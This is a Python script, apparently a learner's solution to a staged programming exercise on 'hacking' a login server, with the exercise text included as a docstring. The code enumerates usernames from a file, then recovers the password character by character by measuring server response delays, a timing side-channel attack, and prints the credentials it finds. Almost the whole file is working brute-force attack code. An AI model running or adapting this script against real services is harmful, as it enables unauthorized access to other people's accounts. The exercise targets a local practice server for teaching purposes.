import itertools
import socket
import sys
import os
import json
import string
import time


def brute_force(**kwargs):
    with socket.socket() as client_socket:
        hostname = kwargs['ip']
        port = int(kwargs['port'])
        address = (hostname, port)
        client_socket.connect(address)
        path = os.path.join(os.getcwd(), 'hacking\\logins.txt')
        with open(path, 'r', encoding='utf-8') as file_logins:
            for login in file_logins:
                json_string = json.dumps({'login': login.rstrip(), 'password': ' '})
                client_socket.send(json_string.encode())
                response = client_socket.recv(1024)
                response = response.decode('utf-8')
                response_deserial = json.loads(response)
                if response_deserial['result'] == 'Wrong login!':
                    continue
                else:
                    true_login = login.rstrip()
                    break
            password = ''
            status = False
            while True:
                for letter in itertools.chain(string.ascii_lowercase, string.ascii_uppercase, string.digits):
                    json_string = json.dumps({'login': true_login, 'password': password + letter})
                    client_socket.send(json_string.encode())
                    start = time.perf_counter()
                    response = client_socket.recv(1024)
                    end = time.perf_counter()
                    diff_time = (end - start)
                    response = response.decode('utf-8')
                    response_deserial = json.loads(response)
                    if response_deserial['result'] == 'Wrong password!' and diff_time < 0.1:
                        continue
                    elif response_deserial['result'] == 'Wrong password!' and diff_time >= 0.1:
                        password += letter
                        break
                    elif response_deserial['result'] == "Connection success!":
                        print(json.dumps({'login': true_login, 'password': password + letter}))
                        status = True
                        break
                if status:
                    break


param = {'ip': sys.argv[1], 'port': sys.argv[2]}

brute_force(**param)

"""
Stage 5/5: Time-based vulnerability

Description

Your program has successfully hacked the new system! However, you've been spotted: the admin noticed your first failed attempts, found the vulnerability and made a patch. You should overcome this patch and hack the system again. It’s not easy being a hacker!

The admin has improved the server: the program now catches the exception and sends a simple ‘wrong password’ message to the client even when the real password starts with current symbols.

But here's the thing: the admin probably just caught this exception. We know that catching an exception takes the computer a long time, so there should be a delay in the server response when this exception takes place. You can use it to hack the system: count the time period in which the response comes and find out which starting symbols work out for the password.

Objectives

In this stage, you should write a program that uses the time vulnerability to find the password.

Use the list of logins from the previous stage.
Output the result as you did this in the previous stage.

Examples

The greater-than symbol followed by a space (> ) represents the user input. Note that it's not part of the input.

Example 1:

> python hack.py localhost 9090
{
    "login" : "su",
    "password" : "fTUe3O99Rre"
}
Example 2:

> python hack.py localhost 9090
{"login": "admin3", "password": "mlqDz33x"}
"""